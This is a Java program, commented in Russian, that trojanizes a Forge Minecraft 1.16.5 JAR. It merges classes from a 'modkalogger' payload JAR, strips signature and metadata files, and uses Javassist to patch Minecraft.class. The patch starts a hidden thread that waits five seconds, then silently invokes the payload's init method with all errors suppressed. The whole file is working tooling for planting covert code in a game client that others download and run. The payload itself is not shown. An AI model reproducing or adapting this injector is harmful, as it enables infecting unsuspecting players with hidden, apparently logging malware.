import javassist.*;

import java.io.*;
import java.nio.file.*;
import java.util.jar.*;

/**
 * Инъектор для вшивания кода в Minecraft 1.16.5 JAR
 * Модифицирует Minecraft.class для запуска скрытого кода
 */
public class MinecraftInjector {
    
    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.out.println("Usage: java MinecraftInjector <forge.jar> <output.jar>");
            System.out.println("Example: java MinecraftInjector forge-1.16.5.jar forge_injected.jar");
            System.exit(1);
        }
        
        String inputJar = args[0];
        String outputJar = args[1];
        String payloadJar = "build/libs/modkalogger-1.0.0.jar";
        
        System.out.println("==================================================");
        System.out.println("Minecraft 1.16.5 Bytecode Injector");
        System.out.println("==================================================");
        
        File tempDir = new File("temp_mc_" + System.currentTimeMillis());
        tempDir.mkdir();
        
        try {
            // 1. Распаковываем Forge JAR
            System.out.println("[1/5] Extracting Forge JAR...");
            unzip(inputJar, tempDir);
            
            // 2. Распаковываем payload классы
            System.out.println("[2/5] Adding payload classes...");
            unzipSkipMeta(payloadJar, tempDir);
            
            // 3. Находим Minecraft.class
            System.out.println("[3/5] Finding Minecraft.class...");
            File mcClass = new File(tempDir, "net/minecraft/client/Minecraft.class");
            if (!mcClass.exists()) {
                // Пробуем другие варианты
                mcClass = findClass(tempDir, "Minecraft.class");
            }
            
            if (mcClass == null) {
                throw new Exception("Minecraft.class not found!");
            }
            
            System.out.println("      Found: " + mcClass.getPath());
            
            // 4. Модифицируем Minecraft.class
            System.out.println("[4/5] Injecting payload...");
            injectPayload(tempDir, mcClass);
            
            // 5. Собираем JAR
            System.out.println("[5/5] Creating output JAR...");
            createJar(tempDir, outputJar);
            
            deleteDirectory(tempDir);
            
            System.out.println("==================================================");
            System.out.println("[+] SUCCESS! Injected into: " + outputJar);
            System.out.println("==================================================");
            
        } catch (Exception e) {
            System.err.println("[!] ERROR: " + e.getMessage());
            e.printStackTrace();
            deleteDirectory(tempDir);
            System.exit(1);
        }
    }
    
    /**
     * Инъекция вызова payload в Minecraft.class
     */
    private static void injectPayload(File tempDir, File mcClass) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(tempDir.getAbsolutePath());
        
        String className = mcClass.getAbsolutePath()
            .replace(tempDir.getAbsolutePath(), "")
            .replace("\\", "/")
            .replace("/", ".")
            .replace(".class", "");
        
        if (className.startsWith(".")) {
            className = className.substring(1);
        }
        
        CtClass ctClass = pool.get(className);
        
        // Находим метод init() или run()
        CtMethod initMethod = null;
        try {
            initMethod = ctClass.getDeclaredMethod("init");
        } catch (NotFoundException e) {
            try {
                initMethod = ctClass.getDeclaredMethod("run");
            } catch (NotFoundException e2) {
                // Берём любой подходящий метод
                for (CtMethod m : ctClass.getDeclaredMethods()) {
                    if (!m.getName().startsWith("<") && m.getParameterTypes().length == 0) {
                        initMethod = m;
                        break;
                    }
                }
            }
        }
        
        if (initMethod != null) {
            // Вставляем вызов payload в начало метода
            initMethod.insertBefore(
                "new Thread(() -> {" +
                "  try {" +
                "    Thread.sleep(5000);" +
                "    Class.forName(\"com.modkalogger.ModKaLogger\").getMethod(\"init\").invoke(null);" +
                "  } catch (Exception e) {}" +
                "}).start();"
            );
            System.out.println("      Injected into method: " + initMethod.getName());
        } else {
            // Вставляем в статический инициализатор
            CtConstructor clinit = ctClass.getClassInitializer();
            if (clinit == null) {
                clinit = ctClass.makeClassInitializer();
            }
            clinit.insertBefore(
                "new Thread(() -> {" +
                "  try {" +
                "    Thread.sleep(5000);" +
                "    Class.forName(\"com.modkalogger.ModKaLogger\").getMethod(\"init\").invoke(null);" +
                "  } catch (Exception e) {}" +
                "}).start();"
            );
            System.out.println("      Injected into <clinit>");
        }
        
        ctClass.writeFile(tempDir.getAbsolutePath());
        ctClass.detach();
    }
    
    private static File findClass(File dir, String name) {
        for (File f : dir.listFiles()) {
            if (f.isDirectory()) {
                File found = findClass(f, name);
                if (found != null) return found;
            } else if (f.getName().equals(name)) {
                return f;
            }
        }
        return null;
    }
    
    private static void unzip(String jarPath, File destDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(jarPath))) {
            ZipEntry entry;
            byte[] buffer = new byte[8192];
            
            while ((entry = zis.getNextEntry()) != null) {
                File file = new File(destDir, entry.getName());
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    file.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }
    
    private static void unzipSkipMeta(String jarPath, File destDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(jarPath))) {
            ZipEntry entry;
            byte[] buffer = new byte[8192];
            
            while ((entry = zis.getNextEntry()) != null) {
                String name = entry.getName();
                if (name.endsWith("mods.toml") || name.endsWith("MANIFEST.MF") || 
                    name.contains("pack.mcmeta") || name.endsWith(".SF") || 
                    name.endsWith(".DSA") || name.endsWith(".RSA")) {
                    continue;
                }
                
                File file = new File(destDir, name);
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    file.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }
    
    private static void createJar(File sourceDir, String jarPath) throws Exception {
        Manifest manifest = new Manifest();
        File mf = new File(sourceDir, "META-INF/MANIFEST.MF");
        if (mf.exists()) {
            try (FileInputStream fis = new FileInputStream(mf)) {
                manifest.read(fis);
            }
        }
        
        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarPath), manifest)) {
            addFiles(sourceDir, "", jos);
        }
    }
    
    private static void addFiles(File file, String path, JarOutputStream jos) throws Exception {
        if (file.isDirectory()) {
            for (File child : file.listFiles()) {
                String childPath = path.isEmpty() ? child.getName() : path + "/" + child.getName();
                addFiles(child, childPath, jos);
            }
        } else {
            if (path.endsWith("MANIFEST.MF")) return;
            jos.putNextEntry(new JarEntry(path));
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buffer = new byte[8192];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    jos.write(buffer, 0, len);
                }
            }
            jos.closeEntry();
        }
    }
    
    private static void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            for (File f : dir.listFiles()) {
                deleteDirectory(f);
            }
        }
        dir.delete();
    }
}
